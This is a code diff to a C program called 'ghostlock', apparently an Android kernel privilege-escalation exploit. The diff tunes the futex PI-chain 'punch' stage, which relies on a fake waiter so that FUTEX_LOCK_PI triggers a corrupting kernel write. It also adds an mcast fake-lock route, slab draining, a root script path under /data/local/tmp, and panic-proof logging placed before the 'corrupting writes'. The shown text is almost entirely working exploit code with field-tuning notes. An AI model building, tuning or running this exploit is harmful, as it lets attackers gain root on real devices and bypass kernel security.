@@ -133,6 +133,24 @@ atomic_int consumer_inflight;
 atomic_int main_route_delay_usec;
 atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
+atomic_int consumer_sched_ret;
+atomic_int consumer_sched_errno;
+atomic_int consumer_futex_ret;
+atomic_int consumer_futex_errno;
+atomic_int consumer_futex_locked;
+atomic_int consumer_futex_entered;
+/* Punch mode: -1 = auto (mcast route -> 2, pselect route -> 0),
+ * 0 = sched_setattr only (futex lock as fallback on failure),
+ * 1 = FUTEX_LOCK_PI only, 2 = sched_setattr then FUTEX_LOCK_PI. Round-2
+ * device logs showed sched_setattr alone succeeding (calls=1 success=1)
+ * without a verified write, so the mcast route defaults to the direct
+ * pi-chain walk (FUTEX_LOCK_PI on the target). Tuned by GHOSTLOCK_PUNCH
+ * (env) or punch= (ghostlock.conf) before threads start. */
+int punch_mode = -1;
+int punch_vary_nice = 0;
+int punch_max_calls = CONSUMER_MAX_CALLS;
+int punch_burst = PSELECT_CONSUMER_BURST_CALLS;
+int punch_delay_usec = -1;
 int memfd_leak;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -148,7 +166,11 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  do_pselect_fake_lock_route();
+  if (active_offsets && active_offsets->mcast_payload_off) {
+    do_mcast_fake_lock_route();
+  } else {
+    do_pselect_fake_lock_route();
+  }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -185,26 +207,58 @@ void *consumer_thread(void *arg __attribute__((unused))) {
     while (!atomic_load(&punch_consume_stop) &&
            atomic_load(&punch_consume_go) == seq) {
       int delay_usec = atomic_load(&main_route_delay_usec);
+      if (punch_delay_usec >= 0) delay_usec = punch_delay_usec;
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
-      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+      for (int burst = 0; burst < punch_burst; burst++) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
-        if (sched_ret != 0) {
+        long sched_ret = -1;
+        long fret = -1;
+        int futex_errno = 0;
+        if (punch_mode != 1) {
+          int nice = punch_vary_nice
+                         ? ((seen * 7 + calls_this_seq) % 19) + 1
+                         : PSELECT_CONSUMER_NICE;
+          errno = 0;
+          sched_ret = sched_setattr_tid(tid, nice);
+          atomic_store(&consumer_sched_ret, (int)sched_ret);
+          atomic_store(&consumer_sched_errno, errno);
+        }
+        if (punch_mode == 1 || punch_mode == 2 || sched_ret != 0) {
+          /* FUTEX_LOCK_PI on the target walks the pi_state chain; the fake
+           * waiter's pi_tree rb_erase fires the write during the enqueue. A
+           * timeout/again return means the consumer was enqueued and walked
+           * the chain (owner never unlocks), which is the landed signal. */
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
-          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+          errno = 0;
+          fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+          futex_errno = errno;
+          atomic_store(&consumer_futex_ret, (int)fret);
+          atomic_store(&consumer_futex_errno, futex_errno);
           if (fret == 0) {
             futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-            sched_ret = 0;
+            atomic_fetch_add(&consumer_futex_locked, 1);
+          } else if (futex_errno == ETIMEDOUT || futex_errno == EAGAIN) {
+            atomic_fetch_add(&consumer_futex_entered, 1);
           }
         }
-        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
+        int landed = (sched_ret == 0) ||
+                     (fret == 0) ||
+                     (fret < 0 && (futex_errno == ETIMEDOUT ||
+                                   futex_errno == EAGAIN));
+        if (landed) atomic_fetch_add(&consumer_success, 1);
+        if (punch_mode != 0 || sched_ret != 0) {
+          pr_info("punch seq=%d call=%d sched=%ld/%d futex=%ld/%d landed=%d\n",
+                  seq, calls_this_seq, sched_ret,
+                  atomic_load(&consumer_sched_errno),
+                  fret, futex_errno, landed);
+        }
         atomic_store(&consumer_inflight, 0);
         calls_this_seq++;
-        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+        if (calls_this_seq >= punch_max_calls) {
           atomic_store(&punch_consume_go, 0);
           break;
         }
@@ -223,6 +277,10 @@ void reset_main_route_state(void) {
   atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
   atomic_store(&consumer_inflight, 0);
+  atomic_store(&consumer_sched_ret, -1); atomic_store(&consumer_sched_errno, 0);
+  atomic_store(&consumer_futex_ret, -1); atomic_store(&consumer_futex_errno, 0);
+  atomic_store(&consumer_futex_locked, 0);
+  atomic_store(&consumer_futex_entered, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
   atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
   cfi_last_step = 0; cfi_last_errno = 0;
@@ -342,6 +400,122 @@ static void slab_drain(void) {
 
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
+static int g_log_fd = -1;
+
+/* Synchronous real-time file log: every pr_* line goes to stdout (colored)
+ * and is appended uncolored to the fd opened here. No background thread and
+ * no stdio buffering are involved, so every fork() in the exploit stays
+ * single-threaded: a tee thread used to race fwrite/fflush stdio locks into
+ * forked W2/W3 children and intermittently hang their fopen/fread of
+ * /proc/self/comm. */
+static void log_line_strip_ansi(const char *in, size_t len, int fd) {
+  for (size_t i = 0; i < len;) {
+    if (in[i] == 0x1b && i + 1 < len) {
+      /* skip one \033[...m escape sequence */
+      size_t j = i + 1;
+      while (j < len && j < i + 16 &&
+             !(in[j] >= 0x40 && in[j] <= 0x7e)) {
+        j++;
+      }
+      if (j < len && j < i + 16 && in[j] >= 0x40 && in[j] <= 0x7e) {
+        i = j + 1;
+        continue;
+      }
+    }
+    if (write(fd, in + i, 1) != 1) {
+      break;
+    }
+    i++;
+  }
+}
+
+/* Force the log file out of the page cache. write() alone only reaches
+ * memory; on an unclean reboot (hang -> watchdog/panic) the dirty pages and
+ * the inode size update are lost and ghostlock.log comes back 0 bytes.
+ * fdatasync flushes data + size metadata. Called from log_line() after every
+ * line and explicitly before fork/clone/corrupting writes, i.e. the points
+ * where a hang or panic is most likely. */
+void log_flush_file(void) {
+  if (g_log_fd >= 0) {
+    fdatasync(g_log_fd);
+  }
+}
+
+void log_line(const char *color, const char *prefix,
+              const char *fmt, ...) {
+  char out[2304];
+  int off = 0;
+  if (color && color[0]) {
+    off = snprintf(out, sizeof(out), "%s%s%s", color, prefix, COLOR_DEFAULT);
+  } else {
+    off = snprintf(out, sizeof(out), "%s", prefix);
+  }
+  if (off < 0 || off >= (int)sizeof(out)) {
+    off = (int)sizeof(out) - 1;
+  }
+  va_list ap;
+  va_start(ap, fmt);
+  int body = vsnprintf(out + off, sizeof(out) - off, fmt, ap);
+  va_end(ap);
+  size_t total = (size_t)(off + body);
+  if (total > sizeof(out)) {
+    total = sizeof(out);
+  }
+  ssize_t wr = write(STDOUT_FILENO, out, total);
+  (void)wr;
+  if (g_log_fd >= 0) {
+    log_line_strip_ansi(out, total, g_log_fd);
+    /* Sync every line so an unclean reboot cannot lose the tail or zero the
+     * file (page cache is dropped on hang -> watchdog/panic). */
+    fdatasync(g_log_fd);
+  }
+}
+
+void init_file_log(void) {
+  char path[320];
+  /* Pick the first writable candidate so the log lands somewhere easy to
+   * pull: GHOSTLOCK_LOG (explicit), /sdcard/Download (root/shell runs),
+   * GHOSTLOCK_LOG_DIR (app external files dir, scoped-storage safe),
+   * then GHOSTLOCK_HOME as the always-works fallback. */
+  char download_path[320];
+  snprintf(download_path, sizeof(download_path),
+           "/sdcard/Download/ghostlock.log");
+  char ext_path[320];
+  ext_path[0] = '\0';
+  const char *ext_dir = getenv("GHOSTLOCK_LOG_DIR");
+  if (ext_dir && ext_dir[0]) {
+    snprintf(ext_path, sizeof(ext_path), "%s/ghostlock.log", ext_dir);
+  }
+  char home_path[320];
+  snprintf(home_path, sizeof(home_path), "%s/ghostlock.log", g_home_dir);
+
+  const char *candidates[4];
+  int n_candidates = 0;
+  const char *explicit = getenv("GHOSTLOCK_LOG");
+  if (explicit && explicit[0]) {
+    candidates[n_candidates++] = explicit;
+  }
+  candidates[n_candidates++] = download_path;
+  if (ext_path[0]) {
+    candidates[n_candidates++] = ext_path;
+  }
+  candidates[n_candidates++] = home_path;
+
+  for (int i = 0; i < n_candidates; i++) {
+    int fd = open(candidates[i], O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC,
+                  0644);
+    if (fd >= 0) {
+      g_log_fd = fd;
+      snprintf(path, sizeof(path), "%s", candidates[i]);
+      break;
+    }
+  }
+  if (g_log_fd < 0) {
+    pr_warning("log file open failed home=%s errno=%d\n", home_path, errno);
+    return;
+  }
+  pr_info("log tee -> %s\n", path);
+}
 
 static void init_runtime_paths(void) {
   const char *home = getenv("GHOSTLOCK_HOME");
@@ -356,6 +530,80 @@ static void init_runtime_paths(void) {
   snprintf(g_root_script_path, sizeof(g_root_script_path),
            "%s/.ghostlock_root.sh", g_home_dir);
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
+}
+
+/* Punch tuning: defaults come from common.h, then ghostlock.conf lines
+ * (KEY=VALUE) in GHOSTLOCK_HOME, then GHOSTLOCK_PUNCH* env vars. The App
+ * launch only forwards GHOSTLOCK_HOME/TMPDIR/HOME, so the config file is
+ * the way to change behaviour in app runs (write it with ksud root). */
+static void parse_punch_knobs(void) {
+  struct knob_set {
+    const char *key;
+    const char *env;
+    int *target;
+    int min;
+    int max;
+  } knobs[] = {
+    {"PUNCH", "GHOSTLOCK_PUNCH", NULL, 0, 2},
+    {"VARY_NICE", "GHOSTLOCK_PUNCH_VARY_NICE", &punch_vary_nice, 0, 1},
+    {"CALLS", "GHOSTLOCK_PUNCH_CALLS", &punch_max_calls, 1, 64},
+    {"BURST", "GHOSTLOCK_PUNCH_BURST", &punch_burst, 1, 64},
+    {"DELAY_USEC", "GHOSTLOCK_PUNCH_DELAY_USEC", &punch_delay_usec, -1, 1000000},
+  };
+  static const char *mode_names[3] = {"sched", "futex", "both"};
+
+  char conf[300];
+  snprintf(conf, sizeof(conf), "%s/ghostlock.conf", g_home_dir);
+  FILE *fp = fopen(conf, "r");
+  if (fp) {
+    char line[128];
+    while (fgets(line, sizeof(line), fp)) {
+      char key[32] = {0};
+      char value[64] = {0};
+      if (sscanf(line, " %31[^= \t] = %63s", key, value) != 2) {
+        continue;
+      }
+      for (size_t i = 0; i < sizeof(knobs) / sizeof(knobs[0]); i++) {
+        if (strcmp(key, knobs[i].key) != 0) {
+          continue;
+        }
+        if (strcmp(knobs[i].key, "PUNCH") == 0) {
+          for (int m = 0; m < 3; m++) {
+            if (strcmp(value, mode_names[m]) == 0) punch_mode = m;
+          }
+        } else {
+          int v = atoi(value);
+          if (v >= knobs[i].min && v <= knobs[i].max) {
+            *knobs[i].target = v;
+          }
+        }
+      }
+    }
+    fclose(fp);
+  }
+
+  const char *env_punch = getenv("GHOSTLOCK_PUNCH");
+  if (env_punch && env_punch[0]) {
+    for (int m = 0; m < 3; m++) {
+      if (strcmp(env_punch, mode_names[m]) == 0) punch_mode = m;
+    }
+  }
+  for (size_t i = 0; i < sizeof(knobs) / sizeof(knobs[0]); i++) {
+    const char *val = knobs[i].env ? getenv(knobs[i].env) : NULL;
+    if (!val || !val[0] || strcmp(knobs[i].key, "PUNCH") == 0) {
+      continue;
+    }
+    int v = atoi(val);
+    if (v >= knobs[i].min && v <= knobs[i].max) {
+      *knobs[i].target = v;
+    }
+  }
+  if (punch_mode < 0) {
+    punch_mode = (active_offsets && active_offsets->mcast_payload_off) ? 2 : 0;
+  }
+  pr_info("punch mode=%s vary_nice=%d calls=%d burst=%d delay_usec=%d\n",
+          mode_names[punch_mode], punch_vary_nice,
+          punch_max_calls, punch_burst, punch_delay_usec);
 }
 
 static void write_root_script(void) {
@@ -629,6 +877,10 @@ static pid_t spawn_child(struct child_pipes *p) {
   p->task_r = p1[0]; p->task_w = p1[1];
   p->cmd_r = p2[0]; p->cmd_w = p2[1];
   p->uid_r = p3[0]; p->uid_w = p3[1];
+  /* The forked W2/W3 leaf probe is the main hang point (inherited stdio
+   * locks on /proc/self/comm reads); flush before it so the log up to the
+   * spawn survives an unclean reboot. */
+  log_flush_file();
   pid_t child = fork();
   if (child < 0) return -1;
   if (child == 0) { child_main(p); _exit(1); }
@@ -644,6 +896,8 @@ static int retry_write_stage(
     int leaf) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
+    /* Make the attempt marker durable before a write that can panic. */
+    log_flush_file();
     if (attempt == 1) slab_drain();
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
@@ -747,9 +1001,11 @@ int run_exploit(int argc, char **argv) {
   signal(SIGPIPE, SIG_IGN);
   set_limit();
   init_runtime_paths();
+  init_file_log();
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
+  parse_punch_knobs();
 
   log_startup_context();
   init_p0_profile();
